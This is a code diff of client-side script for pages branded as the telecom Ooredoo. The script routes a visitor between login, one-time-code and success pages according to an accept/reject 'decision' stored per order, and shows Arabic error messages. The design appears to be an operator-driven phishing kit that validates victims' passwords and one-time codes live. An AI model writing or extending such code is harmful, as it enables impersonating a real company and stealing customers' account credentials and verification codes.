@@ -78,25 +78,31 @@
 
 <script>
   function getFlowDecision() {
-    return localStorage.getItem('ooredooDecision') || sessionStorage.getItem('ooredooDecision') || '';
+    const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-' + Date.now();
+    return localStorage.getItem('ooredooDecision_' + orderId) || sessionStorage.getItem('ooredooDecision_' + orderId) || localStorage.getItem('ooredooDecision') || sessionStorage.getItem('ooredooDecision') || '';
   }
 
   function setFlowDecision(decision) {
+    const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-' + Date.now();
     try {
+      localStorage.setItem('ooredooDecision_' + orderId, decision);
+      sessionStorage.setItem('ooredooDecision_' + orderId, decision);
       localStorage.setItem('ooredooDecision', decision);
       sessionStorage.setItem('ooredooDecision', decision);
     } catch (err) {}
   }
 
   function checkDecision() {
-    const decision = getFlowDecision();
-    const flow = sessionStorage.getItem('ooredooFlow') || 'login';
     const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-' + Date.now();
+    const decision = getFlowDecision();
+    const flow = localStorage.getItem('ooredooFlow_' + orderId) || sessionStorage.getItem('ooredooFlow_' + orderId) || sessionStorage.getItem('ooredooFlow') || 'login';
 
     if (decision === 'accept') {
       if (flow === 'otp') {
-        localStorage.removeItem('ooredooDecision');
-        sessionStorage.removeItem('ooredooDecision');
+        localStorage.removeItem('ooredooDecision_' + orderId);
+        sessionStorage.removeItem('ooredooDecision_' + orderId);
+        localStorage.removeItem('ooredooFlow_' + orderId);
+        sessionStorage.removeItem('ooredooFlow_' + orderId);
         sessionStorage.setItem('ooredooFlow', 'otp');
         window.location.href = 'success.html';
         return;
@@ -121,8 +127,10 @@
       }
 
       sessionStorage.setItem('loginError', 'تم قبول الطلب. يرجى متابعة التحقق من الرمز.');
-      localStorage.removeItem('ooredooDecision');
-      sessionStorage.removeItem('ooredooDecision');
+      localStorage.removeItem('ooredooDecision_' + orderId);
+      sessionStorage.removeItem('ooredooDecision_' + orderId);
+      localStorage.removeItem('ooredooFlow_' + orderId);
+      sessionStorage.removeItem('ooredooFlow_' + orderId);
       sessionStorage.setItem('ooredooFlow', 'otp');
       window.location.href = 'otp_ooredoo.html';
       return;
@@ -131,16 +139,20 @@
     if (decision === 'reject') {
       if (flow === 'otp') {
         sessionStorage.setItem('otpError', 'الرمز غير صحيح أو غير صالح');
-        localStorage.removeItem('ooredooDecision');
-        sessionStorage.removeItem('ooredooDecision');
+        localStorage.removeItem('ooredooDecision_' + orderId);
+        sessionStorage.removeItem('ooredooDecision_' + orderId);
+        localStorage.removeItem('ooredooFlow_' + orderId);
+        sessionStorage.removeItem('ooredooFlow_' + orderId);
         sessionStorage.setItem('ooredooFlow', 'otp');
         window.location.href = 'otp_ooredoo.html';
         return;
       }
 
       sessionStorage.setItem('loginError', 'اسم المستخدم أو كلمة المرور غير صحيح');
-      localStorage.removeItem('ooredooDecision');
-      sessionStorage.removeItem('ooredooDecision');
+      localStorage.removeItem('ooredooDecision_' + orderId);
+      sessionStorage.removeItem('ooredooDecision_' + orderId);
+      localStorage.removeItem('ooredooFlow_' + orderId);
+      sessionStorage.removeItem('ooredooFlow_' + orderId);
       sessionStorage.setItem('ooredooFlow', 'login');
       window.location.href = 'login_ooredoo.html';
       return;
